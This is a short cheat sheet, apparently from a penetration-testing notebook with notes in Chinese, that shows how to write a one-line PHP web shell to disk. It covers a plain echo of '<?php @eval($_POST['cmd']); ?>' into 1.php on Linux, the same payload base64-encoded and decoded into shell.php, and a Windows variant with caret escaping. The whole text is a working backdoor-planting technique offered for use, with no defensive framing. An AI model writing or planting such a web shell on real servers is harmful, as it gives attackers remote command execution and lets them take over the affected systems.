Linux
```
需要转义$
echo "<?php @eval(\$_POST['cmd']); ?>" > ./1.php

echo "PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=" | base64 -d > shell.php
不加-d不解码
```

Windows
```
echo ^<?php @eval($_POST[cmd]);?^> > ./1.php
```
